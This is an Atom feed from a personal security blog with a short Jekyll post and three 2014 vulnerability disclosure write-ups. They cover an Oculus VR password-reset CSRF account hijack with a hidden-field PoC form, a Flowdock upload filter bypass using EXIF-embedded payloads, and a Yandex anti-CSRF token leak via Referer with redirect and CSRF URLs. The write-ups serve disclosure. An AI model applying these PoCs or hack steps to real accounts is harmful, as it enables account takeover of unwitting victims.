<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">

 <title>.adrian{}</title>
 <link href="http://deadstar1.github.io/atom.xml" rel="self"/>
 <link href="http://deadstar1.github.io/"/>
<<<<<<< HEAD
 <updated>2016-03-28T05:20:20+00:00</updated>
=======
 <updated>2016-03-28T05:12:50+00:00</updated>
>>>>>>> cleanup
 <id>http://deadstar1.github.io</id>
 <author>
   <name>Adrian Belen</name>
   <email>maradriantest@gmail.com</email>
 </author>

 
 <entry>
   <title>What&#39;s Jekyll?</title>
   <link href="http://deadstar1.github.io/2016/01/01/whats-jekyll/"/>
   <updated>2016-01-01T00:00:00+00:00</updated>
   <id>http://deadstar1.github.io/2016/01/01/whats-jekyll</id>
   <content type="html">&lt;p&gt;&lt;a href=&quot;http://jekyllrb.com/&quot;&gt;Jekyll&lt;/a&gt; &lt;code class=&quot;highlighter-rouge&quot;&gt;http://jekyllrb.com/ssssssssssss/sss/sss/s&lt;/code&gt; is a static site generator, an open-source tool for creating simple yet powerful websites of all shapes and sizes. From &lt;a href=&quot;https://github.com/jekyll/jekyll/blob/master/README.markdown&quot;&gt;the project’s readme&lt;/a&gt;:&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;Jekyll is a simple, blog aware, static site generator. It takes a template directory […] and spits out a complete, static website suitable for serving with Apache or your favorite web server. This is also the engine behind GitHub Pages, which you can use to host your project’s page or blog right here from GitHub.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;It’s an immensely useful tool. Find out more by &lt;a href=&quot;https://github.com/jekyll/jekyll&quot;&gt;visiting the project on GitHub&lt;/a&gt;.&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>OCULUS VR account hijacking via password reset vulnerability</title>
   <link href="http://deadstar1.github.io/2014/08/15/OCULUS-VR-account-hijacking!-via-password-reset-vulnerability/"/>
   <updated>2014-08-15T00:00:00+00:00</updated>
   <id>http://deadstar1.github.io/2014/08/15/OCULUS-VR-account-hijacking!-via-password-reset-vulnerability</id>
   <content type="html">&lt;p&gt;Oculus VR is a virtual reality technology company founded by Brendan Iribe and Palmer Luckey. Their first product, still in development, is the Oculus Rift, a head-mounted display for immersive virtual reality(VR). In March 2014,Facebook agreed to acquire Oculus VR for US$2 billion in cash and Facebook stock.&lt;/p&gt;

&lt;p&gt;While testing the forgot password functionality of oculusVR .I have found that it’s possible to abuse this functionality.
Here is a algorithm how the reset password functionality of oculus VR works.&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;if (user is log in){
//the app will not use auth parameter which is a reset password passcode. Then change the password of the user who is currently log in.

}
else{
//if the user is not log in ,oculus uses the auth parameter to identify which account to be reset.

}&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;img src=&quot;https://4.bp.blogspot.com/-tAuAQSsCwO4/U_LD_b0AOnI/AAAAAAAAAQs/hotORflSwzY/s1600/check1.png&quot; alt=&quot;passw&quot; /&gt;
&lt;code class=&quot;highlighter-rouge&quot;&gt;Although I am log in, password reset page still can be viewed.&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;The main problem here is oculusVR does not have a ANTI-CSRF token on
reset password functionality. :) the only need to hijack a oculusVR account is a valid reset password link token.
Combining the CSRF vulnerability and weird behaviour of password reset page will be resulted to &lt;strong&gt;Account Hijacking vulnerability&lt;/strong&gt;&lt;/p&gt;

&lt;h3 id=&quot;sample-csrf-poc&quot;&gt;Sample CSRF PoC&lt;/h3&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;&amp;lt;body&amp;gt;
&amp;lt;form action=&quot;https://developer.oculusvr.com/core/UserAction.php&quot; method=&quot;POST&quot;&amp;gt;
&amp;lt;input type=&quot;hidden&quot; name=&quot;action&quot; value=&quot;changepassword&quot; /&amp;gt;
&amp;lt;input type=&quot;hidden&quot; name=&quot;auth&quot; value=&quot;your_reset_token&quot; /&amp;gt;
&amp;lt;input type=&quot;hidden&quot; name=&quot;newpassword&quot; value=&quot;attackerpassword&quot; /&amp;gt;
&amp;lt;input type=&quot;hidden&quot; name=&quot;confirmpassword&quot; value=&quot;attackerpassword&quot; /&amp;gt;
&amp;lt;input type=&quot;submit&quot; value=&quot;Submit request&quot; /&amp;gt;
&amp;lt;/form&amp;gt;
&amp;lt;/body&amp;gt;&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;To get the value of auth parameter you must request a reset password link on this link https://developer.oculusvr.com/lostpassword.&lt;/p&gt;

&lt;h3 id=&quot;hack-steps&quot;&gt;HACK STEPS&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;Attacker requests a reset password link&lt;/li&gt;
  &lt;li&gt;Makes a CSRF PoC attack with reset token&lt;/li&gt;
  &lt;li&gt;Sends the csrf poc link to his victim&lt;/li&gt;
  &lt;li&gt;If the victim clicks that link his password will be changed!&lt;/li&gt;
&lt;/ul&gt;
</content>
 </entry>
 
 <entry>
   <title>Flowdock XSS or RCE(malicious file upload)</title>
   <link href="http://deadstar1.github.io/2014/07/26/Flowdock-XSS-or-RCE/"/>
   <updated>2014-07-26T00:00:00+00:00</updated>
   <id>http://deadstar1.github.io/2014/07/26/Flowdock-XSS-or-RCE</id>
   <content type="html">&lt;p&gt;One day I accidentally uploaded a &lt;code class=&quot;highlighter-rouge&quot;&gt;.pdf&lt;/code&gt; filetype on https://www.flowdock.com/oauth/applications page. it was sucessfuly uploaded. So I tried to upload some arbitary filetype, But flowdock rejected it.
Flowdock backlisted all arbirtary content-type such as &lt;code class=&quot;highlighter-rouge&quot;&gt;text/html,pplication/x-asp,pplication/x-perl. ... etc..&lt;/code&gt; and flowdock also checked the signature of a file that used to identify if the file is real image or not.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Error message when I tried to upload a shell!&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://2.bp.blogspot.com/-P21qQh5Oytc/U9NgEyXweRI/AAAAAAAAAPg/EnoMY0H5CXw/s1600/1.png&quot; alt=&quot;ohh&quot; /&gt;&lt;/p&gt;

&lt;p&gt;If we want to upload our shell or html-xss poc we need upload a real image that contain our xss/rce payload. I changed the exif header of the image and upload the file.&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://1.bp.blogspot.com/-gsbzUjnYGmY/U9NgGaYF46I/AAAAAAAAAPo/hB4MN-rQCBc/s1600/2.png&quot; alt=&quot;ohh&quot; /&gt;&lt;/p&gt;

&lt;h3 id=&quot;result&quot;&gt;RESULT:&lt;/h3&gt;

&lt;p&gt;&lt;img src=&quot;http://2.bp.blogspot.com/-mnaUU_-6PTU/U9NgG4o4c-I/AAAAAAAAAP0/oDSsBwRqDTM/s1600/3.png&quot; alt=&quot;ohh&quot; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://1.bp.blogspot.com/-bpdH-nN4tYk/U9NgKLSwt1I/AAAAAAAAAP8/hGoi7rihJN0/s1600/4.png&quot; alt=&quot;ohh&quot; /&gt;
## YEHH!&lt;/p&gt;
</content>
 </entry>
 
 <entry>
   <title>Bypass anti CSRF token of Yandex!</title>
   <link href="http://deadstar1.github.io/2014/05/07/leaking-anti-CSRF-token-of-yandex!/"/>
   <updated>2014-05-07T00:00:00+00:00</updated>
   <id>http://deadstar1.github.io/2014/05/07/leaking-anti-CSRF-token of-yandex!</id>
   <content type="html">&lt;p&gt;When you browse a link in docviewer.yandex.com, The site will recreate a token named &lt;code class=&quot;highlighter-rouge&quot;&gt;sk&lt;/code&gt;, which is used to validate a redirection and anti-csrf token
&lt;code class=&quot;highlighter-rouge&quot;&gt;sk&lt;/code&gt; is also an anti-csrf token on&lt;/p&gt;
&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt; http://webmaster.yandex.ru`,`https://docviewer.yandex.com/r.xml.&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;now  If the attacker know the value of your &lt;code class=&quot;highlighter-rouge&quot;&gt;sk&lt;/code&gt; token, he can make a redirection and csrf attack.
 &lt;strong&gt;How to know the token of the victim ???&lt;/strong&gt;.
 Because &lt;code class=&quot;highlighter-rouge&quot;&gt;http://docviewer.yandex.com/r.xml?sk=thecsrftokenofvictim&amp;amp;url=evilsite&lt;/code&gt; useD GET request the params are showed in url and it also changeable to https to http .as a result you can use &lt;code class=&quot;highlighter-rouge&quot;&gt;REFRER HEADER&lt;/code&gt; to get the token.&lt;/p&gt;

&lt;h3 id=&quot;hack-steps&quot;&gt;HACK STEPS&lt;/h3&gt;
&lt;ul&gt;
  &lt;li&gt;Upload a document with link or a hyperlink. that hyperlink is the attacker’s site..&lt;/li&gt;
  &lt;li&gt;Select the file, Share the link using the share button then get the link&lt;/li&gt;
  &lt;li&gt;Browse that link, Then click the view button you will redirect to docviewer.yandex.com&lt;/li&gt;
  &lt;li&gt;Change the https to http to allow us to see the referer in our site.&lt;/li&gt;
&lt;/ul&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt; 
https://docviewer.yandex.com/?url=ya-disk-public://nhP6POxtEi4v9wDffRyOFHbGQgIOhlsEbLhl3zH9c7k%3D&amp;amp;name=testxxx.odt to http://docviewer.yandex.com/?url=ya-disk-public://nhP6POxtEi4v9wDffRyOFHbGQgIOhlsEbLhl3zH9c7k%3D&amp;amp;name=testxxx.odt&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;ul&gt;
  &lt;li&gt;Send the url to victim and induce him to click the link for attacker’site to able to leak the anti-CSRF token.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;now you have his &lt;code class=&quot;highlighter-rouge&quot;&gt;sk&lt;/code&gt; token! that is the bypass!&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;for redirection&lt;/strong&gt;&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt; 
 https://docviewer.yandex.com/r.xml?sk=thecsrftokenofvictim&amp;amp;url=evilsite
 &lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;strong&gt;for csrf&lt;/strong&gt; →&lt;/p&gt;

&lt;figure class=&quot;highlight&quot;&gt;&lt;pre&gt;&lt;code class=&quot;language-text&quot; data-lang=&quot;text&quot;&gt;http://webmaster.yandex.com/settings/messages/types.xml?email_1=EMAIL&amp;amp;email_2=EMAIL&amp;amp;message_3=MESSAGE&amp;amp;email_3=EMAIL&amp;amp;message_4=MESSAGE&amp;amp;percent=50&amp;amp;message_5=MESSAGE&amp;amp;message_6=MESSAGE&amp;amp;message_7=MESSAGE&amp;amp;message_8=MESSAGE&amp;amp;email_8=EMAIL&amp;amp;message_9=MESSAGE&amp;amp;message_10=MESSAGE&amp;amp;message_12=MESSAGE&amp;amp;message_17=MESSAGE&amp;amp;message_18=MESSAGE&amp;amp;message_19=MESSAGE&amp;amp;email_19=EMAIL&amp;amp;message_21=MESSAGE&amp;amp;email_21=EMAIL&amp;amp;message_22=MESSAGE&amp;amp;email_22=EMAIL&amp;amp;message_32=MESSAGE&amp;amp;do=save&amp;amp;sk=TOKENOFVICTIM&lt;/code&gt;&lt;/pre&gt;&lt;/figure&gt;

&lt;p&gt;&lt;strong&gt;This is wide CSRF attack which affect other Yandex domain.&lt;/strong&gt;&lt;/p&gt;

&lt;h3 id=&quot;list-of-affected-yandex-domain&quot;&gt;list of affected Yandex domain&lt;/h3&gt;

&lt;ul&gt;
  &lt;li&gt;http://appmetrica.yandex.com/&lt;/li&gt;
  &lt;li&gt;https://calendar.yandex.ru&lt;/li&gt;
  &lt;li&gt;https://disk.yandex.com/&lt;/li&gt;
  &lt;li&gt;docviewer.yandex.com&lt;/li&gt;
  &lt;li&gt;m.contact.yandex.com.tr &amp;amp; etc&lt;/li&gt;
  &lt;li&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;code class=&quot;highlighter-rouge&quot;&gt;NOTE: i used javascript code to get the leaked csrf token on refrerer header  and append it to my CSRF PoC.&lt;/code&gt;&lt;/p&gt;
</content>
 </entry>
 

</feed>
